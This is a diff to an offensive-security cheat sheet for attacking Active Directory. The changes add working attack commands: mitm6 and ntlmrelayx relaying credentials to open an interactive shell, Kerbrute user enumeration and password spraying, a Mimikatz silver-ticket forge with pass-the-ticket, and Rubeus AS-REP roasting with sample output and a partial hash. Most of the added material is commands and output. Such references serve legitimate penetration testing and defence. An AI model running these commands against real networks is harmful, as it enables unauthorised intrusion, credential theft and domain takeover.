@@ -13,6 +13,7 @@
   * [Silver Tickets](#passtheticket-silver-tickets)
   * [Trust Tickets](#trust-tickets)
   * [Kerberoast](#kerberoast)
+  * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
   * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
@@ -20,6 +21,7 @@
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [PrivExchange attack](#privexchange-attack)
+  * [Password spraying](#password-spraying)
 * [Privilege Escalation](#privilege-escalation)
   * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
   * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
@@ -43,6 +45,8 @@
   SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
   or 
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+  or 
+  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
   ```
 
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
@@ -60,6 +64,18 @@
   crackmapexec mimikatz --server http --server-port 80
   ```
 
+* [Mitm6](https://github.com/fox-it/mitm6.git)
+
+  ```bash
+  git clone https://github.com/fox-it/mitm6.git && cd mitm6
+  pip install .
+  mitm6 -d lab.local
+  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
+  # -wh: Server hosting WPAD file (Attacker’s IP)
+  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
+  # -i: open an interactive shell
+  ```
+
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
   ```powershell
@@ -68,10 +84,21 @@
   ```
 
 * [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)
+
+    ```powershell
+    powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
+    ```
+
 * [Ping Castle](https://github.com/vletoux/pingcastle)
 
     ```powershell
     pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
+    ```
+
+* [Kerbrute](https://github.com/ropnop/kerbrute)
+
+    ```powershell
+    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
     ```
 
 ## Most common paths to AD compromise
@@ -333,7 +360,7 @@ cat $KRB5CCNAME
 
 
 NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### PassTheTicket Silver Tickets
@@ -343,11 +370,12 @@ Forging a TGS require machine accound password (key) from the KDC
 ```powershell
 Create a ticket for the service
 kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE
+/kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
 
 Then use the same steps as a Golden ticket
 misc::convert ccache ticket.kirbi
 export KRB5CCNAME=/home/user/ticket.ccache
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### Trust Tickets
@@ -377,6 +405,42 @@ Then crack the ticket with hashcat or john
 ```powershell
 hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ./john ~/hash.txt --wordlist=rockyou.lst
+```
+
+### KRB_AS_REP Roasting
+
+If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
+
+```powershell
+C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
+C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : TestOU3user
+[*] Target Domain          : testlab.local
+
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
 ```
 
 ### Pass-the-Hash
@@ -497,6 +561,16 @@ Alternatively you can use the Metasploit module
 
 [`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)
 
+### Password spraying
+
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+```powershell
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+```
+
+
 ## Privilege Escalation
 
 ### PrivEsc Local Admin - Token Impersonation (RottenPotato)
@@ -550,6 +624,7 @@ net group "Domain Admins" hacker2 /add /domain
 ## References
 
 * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
+* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
 * [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
@@ -575,6 +650,8 @@ net group "Domain Admins" hacker2 /add /domain
 * [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
 * [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
 * [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
+* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
+* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
 * [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
 * [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
